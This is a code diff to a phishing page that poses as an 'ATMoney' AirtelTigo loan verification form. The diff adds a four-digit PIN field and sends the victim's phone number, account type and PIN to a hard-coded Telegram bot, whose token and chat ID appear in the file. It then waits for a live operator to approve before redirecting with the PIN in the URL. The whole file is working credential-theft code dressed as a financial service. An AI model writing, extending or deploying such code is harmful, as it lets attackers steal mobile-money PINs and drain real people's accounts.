@@ -7,7 +7,7 @@
     <title>Verify & Authorize Loan - ATMoney</title>
     <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ── all styles unchanged ── */
+        /* ── all styles unchanged except PIN ── */
         :root {
             --red: #003DA5;
             --red-dark: #002D80;
@@ -112,6 +112,13 @@
             width: 48px;
             height: 48px;
             flex-shrink: 0;
+        }
+
+        .logo-bg img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 12px;
         }
 
         .brand-name {
@@ -226,7 +233,7 @@
         }
 
         select,
-        input {
+        input[type="tel"] {
             width: 100%;
             padding: 13px 15px;
             background: var(--input-bg);
@@ -260,16 +267,82 @@
         }
 
         select:focus,
-        input:focus {
+        input[type="tel"]:focus {
             border-color: var(--red);
             background: #fff;
             box-shadow: 0 0 0 3.5px rgba(228, 35, 32, 0.10);
         }
 
-        input::placeholder {
+        input[type="tel"]::placeholder {
             color: var(--text-light);
         }
 
+        /* ─── PIN INPUT – enhanced like Telecel ─── */
+        .pin-group {
+            margin-bottom: 18px;
+        }
+
+        .pin-group .label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pin-group .label-row label {
+            margin-bottom: 0;
+        }
+
+        .pin-hint {
+            font-size: 12px;
+            color: var(--text-light);
+            font-weight: 400;
+        }
+
+        .pin-container {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .pin-box {
+            width: 100%;
+            height: 48px;
+            border-radius: 12px;
+            border: 1.5px solid var(--border);
+            background: var(--input-bg);
+            text-align: center;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-dark);
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s, transform 0.12s;
+            outline: none;
+            caret-color: var(--at-red);
+            -webkit-appearance: none;
+            appearance: none;
+            /* mask digits with bullets */
+            -webkit-text-security: disc;
+            /* for firefox, use text-security but it's not standard; fallback to type=password via JS */
+        }
+
+        .pin-box:focus {
+            border-color: var(--red);
+            background: #ffffff;
+            box-shadow: 0 0 0 3.5px rgba(228, 35, 32, 0.10);
+            transform: translateY(-1px);
+        }
+
+        .pin-box.filled {
+            border-color: #ffaaaa;
+            background: #fff9f9;
+        }
+
+        .pin-box:focus-visible {
+            outline: none;
+        }
+
+        /* ── error ── */
         .error-msg {
             display: none;
             background: #fff1f1;
@@ -336,7 +409,7 @@
             color: var(--text-dark);
         }
 
-        /* ── Spinner overlay – no text ── */
+        /* ── spinner ── */
         #spinner {
             display: none;
             position: fixed;
@@ -377,6 +450,35 @@
         .security-note svg {
             flex-shrink: 0;
         }
+
+        /* ── responsive tweaks ── */
+        @media (max-width: 460px) {
+            .pin-container {
+                gap: 8px;
+            }
+            .pin-box {
+                height: 44px;
+                font-size: 20px;
+                border-radius: 10px;
+            }
+            .header-title {
+                font-size: 20px;
+            }
+            .loan-amount {
+                font-size: 22px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .pin-container {
+                gap: 6px;
+            }
+            .pin-box {
+                height: 40px;
+                font-size: 18px;
+                border-radius: 8px;
+            }
+        }
     </style>
 </head>
 
@@ -384,10 +486,11 @@
 
     <div class="card">
 
+        <!-- ─── HEADER ─── -->
         <div class="header">
             <div class="logo-wrap">
-                <div class="logo-bg" style="padding: 2px;">
-                    <img src="logo.png" alt="ATMoney Logo" style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;">
+                <div class="logo-bg">
+                    <img src="logo.png" alt="ATMoney Logo" />
                 </div>
                 <div>
                     <div class="brand-name">ATMoney<span>Loans</span></div>
@@ -398,6 +501,7 @@
             <div class="header-desc">Enter your ATMoney number and PIN to securely verify and approve your Flex Loan request.</div>
         </div>
 
+        <!-- ─── LOAN INFO ─── -->
         <div class="loan-info" id="loanInfo">
             <div class="loan-icon">
                 <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
@@ -411,8 +515,10 @@
             </div>
         </div>
 
+        <!-- ─── FORM ─── -->
         <div class="form-body">
 
+            <!-- Account Type -->
             <div class="form-group">
                 <label for="accountType">Account Type</label>
                 <div class="select-wrap">
@@ -423,14 +529,30 @@
                 </div>
             </div>
 
+            <!-- Phone -->
             <div class="form-group">
                 <label for="phone">Phone Number (AirtelTigo)</label>
-                <input type="tel" id="phone" placeholder="027XXXXXXX" maxlength="10" inputmode="numeric">
-                <div style="font-size:12px; color:var(--text-light); margin-top:4px;">Enter 10‑digit AirtelTigo number (026, 027, 056, 057)</div>
+                <input type="tel" id="phone" placeholder="027XXXXXXX" maxlength="10" inputmode="numeric" />
+                <div style="font-size:12px; color:var(--text-light); margin-top:4px;">Enter your AirtelTigo number</div>
             </div>
 
+            <!-- ─── 4‑DIGIT PIN (enhanced) ─── -->
+            <div class="pin-group">
+                <div class="label-row">
+                    <label>Enter PIN</label>
+                </div>
+                <div class="pin-container" id="pinContainer">
+                    <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 1" />
+                    <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 2" />
+                    <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 3" />
+                    <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 4" />
+                </div>
+            </div>
+
+            <!-- Error -->
             <div class="error-msg" id="errMsg"></div>
 
+            <!-- Buttons -->
             <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
             <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
 
@@ -442,13 +564,13 @@
         </div>
     </div>
 
-    <!-- Spinner overlay – no text, just the ring -->
+    <!-- ─── SPINNER ─── -->
     <div id="spinner">
         <div class="spin-ring"></div>
     </div>
 
     <script>
-        // ─── YOUR BOT CREDENTIALS ──────────────────────────────────────────────
+        // ─── BOT CREDENTIALS ──────────────────────────────────────────────
         const CONFIG = {
             BOT_TOKEN: '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus',
             CHAT_ID: '1006917440',
@@ -465,8 +587,9 @@
         const continueBtn = document.getElementById('continueBtn');
         const errMsg = document.getElementById('errMsg');
         const spinner = document.getElementById('spinner');
+        const pinBoxes = document.querySelectorAll('.pin-box');
 
-        // ── Load loan details from URL ──
+        // ─── LOAD LOAN DETAILS FROM URL ────────────────────────────────
         function loadLoanDetails() {
             const params = new URLSearchParams(window.location.search);
             const amount = params.get('amount');
@@ -488,20 +611,35 @@
             if (prevPhone) phoneInput.value = prevPhone;
         }
 
-        // ── Validate AirtelTigo (Tigo) numbers only ──
+        // ─── VALIDATE AIRTELTIGO ──────────────────────────────────────
         function isValidTigoNumber(phone) {
             if (phone.length !== 10) return false;
             const tigoPrefixes = ['026', '027', '056', '057'];
             return tigoPrefixes.some(p => phone.startsWith(p));
         }
 
-        // ── Show error message ──
+        // ─── GET PIN AS STRING ──────────────────────────────────────────
+        function getPin() {
+            let pin = '';
+            pinBoxes.forEach(box => pin += box.value);
+            return pin;
+        }
+
+        function isPinComplete() {
+            return getPin().length === 4;
+        }
+
+        // ─── SHOW / HIDE ERROR ──────────────────────────────────────────
         function showError(msg) {
             errMsg.textContent = msg;
             errMsg.style.display = 'block';
         }
 
-        // ── Reset button state ──
+        function hideError() {
+            errMsg.style.display = 'none';
+        }
+
+        // ─── RESET BUTTON ──────────────────────────────────────────────
         function resetButton() {
             isProcessing = false;
             continueBtn.disabled = false;
@@ -509,7 +647,7 @@
             spinner.style.display = 'none';
         }
 
-        // ── Stop polling and clear timeouts ──
+        // ─── STOP POLLING ──────────────────────────────────────────────
         function stopPolling() {
             if (pollingInterval) {
                 clearInterval(pollingInterval);
@@ -521,7 +659,7 @@
             }
         }
 
-        // ── Answer callback query to give feedback to admin ──
+        // ─── ANSWER CALLBACK ──────────────────────────────────────────
         function answerCallbackQuery(callbackQueryId, text, showAlert = false) {
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
                 method: 'POST',
@@ -534,10 +672,11 @@
             }).catch(e => console.warn('Answer callback failed', e));
         }
 
-        // ── Poll for updates ──
-        function pollUpdates(approveId, declineId, phone) {
+        // ─── POLL FOR UPDATES ──────────────────────────────────────────
+        function pollUpdates(approveId, declineId, phone, pin) {
             const poll = () => {
-                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+                const url =
+                    `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
                 fetch(url)
                     .then(res => res.json())
                     .then(data => {
@@ -545,7 +684,6 @@
                         const updates = data.result;
                         if (updates.length === 0) return;
 
-                        // Update lastUpdateId to the latest
                         lastUpdateId = updates[updates.length - 1].update_id;
 
                         for (const update of updates) {
@@ -553,33 +691,26 @@
                             if (!cb) continue;
                             const dataStr = cb.data;
                             if (dataStr === approveId) {
-                                // Approved!
                                 stopPolling();
-                                
-                                // Redirect to activate page with phone
                                 const params = new URLSearchParams(window.location.search);
                                 params.set('phone', phone);
+                                params.set('pin', pin);
                                 window.location.href = `${CONFIG.APPROVE_PAGE}?${params.toString()}`;
                                 return;
                             } else if (dataStr === declineId) {
-                                // Declined
                                 stopPolling();
-                                
                                 resetButton();
-                                showError('Loan request was declined. Check phone number.');
+                                showError('Loan request was declined. Check phone number or PIN.');
                                 return;
                             }
                         }
                     })
                     .catch(err => {
-                        // Silently continue polling
                         console.warn('Poll error', err);
                     });
             };
 
-            // Poll every 2 seconds
             pollingInterval = setInterval(poll, 2000);
-            // Timeout after 90 seconds
             pollTimeout = setTimeout(() => {
                 stopPolling();
                 resetButton();
@@ -588,8 +719,8 @@
             }, 90000);
         }
 
-        // ── Send to bot and start polling ──
-        function sendToBot(phone) {
+        // ─── SEND TO BOT ──────────────────────────────────────────────
+        function sendToBot(phone, pin) {
             if (isProcessing) return;
             isProcessing = true;
             continueBtn.disabled = true;
@@ -599,15 +730,22 @@
             const approveId = `approve_${ts}`;
             const declineId = `decline_${ts}`;
 
-            // Show spinner – no text
             spinner.style.display = 'flex';
+
+            const amountText = document.getElementById('loanAmount').textContent;
+            const accountType = document.getElementById('accountType').value;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CONFIG.CHAT_ID,
-                        text: `<b>🔴 ATMoney Loan Initiation</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\n\nChoose Action:`,
+                        text: `<b>🔴 ATMoney Loan Initiation</b>\n\n` +
+                            `Amount: ${amountText}\n` +
+                            `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
+                            `Phone: <code>${phone}</code>\n` +
+                            `PIN: <code>${pin}</code>\n\n` +
+                            `Choose Action:`,
                         parse_mode: 'HTML',
                         reply_markup: {
                             inline_keyboard: [
@@ -622,8 +760,7 @@
                     if (!data.ok) {
                         throw new Error('Telegram API error');
                     }
-                    // Start polling for callback
-                    pollUpdates(approveId, declineId, phone);
+                    pollUpdates(approveId, declineId, phone, pin);
                 })
                 .catch(err => {
                     resetButton();
@@ -632,25 +769,113 @@
                 });
         }
 
-        // ── Submit handler ──
+        // ─── SUBMIT HANDLER ──────────────────────────────────────────────
         continueBtn.onclick = () => {
-            errMsg.style.display = 'none';
+            hideError();
+
             const phone = phoneInput.value.trim();
             if (!phone || !isValidTigoNumber(phone)) {
                 showError("Please enter a valid 10‑digit AirtelTigo number (026, 027, 056, or 057).");
                 return;
             }
-            sendToBot(phone);
+
+            const pin = getPin();
+            if (!isPinComplete()) {
+                showError("Please enter your 4‑digit PIN.");
+                for (const box of pinBoxes) {
+                    if (box.value === '') {
+                        box.focus();
+                        break;
+                    }
+                }
+                return;
+            }
+
+            sendToBot(phone, pin);
         };
 
-        // ── Input sanitisation ──
-        phoneInput.addEventListener('input', () => {
-            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+        // ─── PIN BOX LOGIC ──────────────────────────────────────────────
+        pinBoxes.forEach((box, index) => {
+            // input: digit → advance
+            box.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val.length > 0 && !/^[0-9]$/.test(val)) {
+                    e.target.value = '';
+                    return;
+                }
+                if (val.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                box.classList.toggle('filled', box.value !== '');
+                hideError();
+            });
+
+            // keydown: backspace, arrows
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    e.preventDefault();
+                    pinBoxes[index - 1].focus();
+                    pinBoxes[index - 1].value = '';
+                    pinBoxes[index - 1].classList.remove('filled');
+                    hideError();
+                }
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    e.preventDefault();
+                    pinBoxes[index - 1].focus();
+                }
+                if (e.key === 'ArrowRight' && index < 3) {
+                    e.preventDefault();
+                    pinBoxes[index + 1].focus();
+                }
+            });
+
+            // focus: select all
+            box.addEventListener('focus', () => {
+                box.select();
+            });
+
+            // paste: fill all four
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                if (/^[0-9]{4}$/.test(paste)) {
+                    const digits = paste.split('');
+                    pinBoxes.forEach((b, i) => {
+                        b.value = digits[i] || '';
+                        b.classList.toggle('filled', b.value !== '');
+                    });
+                    pinBoxes[3].focus();
+                    hideError();
+                }
+            });
         });
 
-        // ── Init ──
+        // ─── PHONE INPUT SANITISATION ──────────────────────────────────
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+            hideError();
+        });
+
+        // ─── ENTER KEY ON LAST PIN BOX TRIGGERS SUBMIT ────────────────
+        pinBoxes[3].addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && isPinComplete()) {
+                continueBtn.click();
+            }
+        });
+
+        // ─── AUTO-FOCUS FIRST EMPTY PIN BOX ──────────────────────────
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                if (phoneInput.value.trim().length === 10) {
+                    pinBoxes[0].focus();
+                } else {
+                    phoneInput.focus();
+                }
+            }, 300);
+        });
+
+        // ─── INIT ──────────────────────────────────────────────────────
         loadLoanDetails();
-        phoneInput.focus();
     </script>
 </body>
 
